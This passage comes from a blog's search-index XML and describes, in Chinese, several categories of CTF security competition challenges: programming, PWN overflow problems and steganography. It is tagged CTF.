Coder)类型，即编程类题目，题目涉及到编程算法，相比ACM较为容易。</p><p>10、PWN类型，PWN在黑客俚语中代表着攻破、取得权限，多为溢出类题目</p><p>11、Stega(Steganography)类型，即隐写术，题目的Flag会隐藏到图片、音频、视频等各类数据载体中供参赛者获取。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
